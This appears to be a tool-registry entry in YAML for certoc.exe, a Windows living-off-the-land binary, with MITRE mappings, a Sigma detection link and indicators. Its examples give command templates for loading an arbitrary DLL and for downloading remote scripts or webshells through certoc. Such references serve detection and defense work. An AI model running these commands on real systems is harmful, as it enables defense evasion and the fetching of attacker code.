---
id: windows-execution-certoc
namespace: windows:execution:certoc
name: certoc
description: 'Used for installing certificates Located at: c:\windows\system32\certoc.exe; c:\windows\syswow64\certoc.exe.'
author: Ensar Samil
version: 1.0.0
capabilities:
- security.execution.command
- network.transfer.download
platforms:
- windows
risk_level: high
trust_level: community
execution_policy: enabled
architectures:
- amd64
dependencies: []
related_tools: []
artifacts: []
workflow_edges:
  produces:
  - command-output
  consumes: []
contract:
  inputs: []
  outputs:
  - type: process.output
    description: Command execution output
  side_effects:
  - network_traffic
  - process_spawn
  resource_cost:
    cpu: low
    memory_mb: 16
    network: medium
    disk_io: low
resource_profile:
  cpu: low
  memory_mb: 16
  network: medium
  disk_io: low
allowed-tools:
- certoc
parameters: []
features: []
execution:
  template: certoc
  sandbox: execFile
  timeout_seconds: 30
  shell: false
global_vars: {}
examples:
- description: Loads the target DLL file (Execute code within DLL file)
  command: certoc.exe -LoadDLL {PATH_ABSOLUTE:.dll}
- description: Downloads text formatted files (Download scripts, webshells etc.)
  command: certoc.exe -GetCACAPS {REMOTEURL:.ps1}
references:
- label: 1445758411803480072?s=20
  url: https://twitter.com/sblmsrsn/status/1445758411803480072?s=20
- label: 1452941226198671363?s=20
  url: https://twitter.com/sblmsrsn/status/1452941226198671363?s=20
techniques:
- execution
- defense-evasion
- exfiltration
mitre_ids:
- T1218
- T1105
detections:
- type: sigma
  url: https://github.com/SigmaHQ/sigma/blob/62d4fd26b05f4d81973e7c8e80d7c1a0c6a29d0e/rules/windows/process_creation/proc_creation_win_certoc_load_dll.yml
- type: ioc
  description: Process creation with given parameter
- type: ioc
  description: Unsigned DLL load via certoc.exe
- type: ioc
  description: Network connection via certoc.exe
install:
- method: choco
  package_name: certoc
  commands:
  - choco install certoc
---


# certoc

certoc is a Windows LOLBin. Used for installing certificates Located at: c:\windows\system32\certoc.exe; c:\windows\syswow64\certoc.exe.
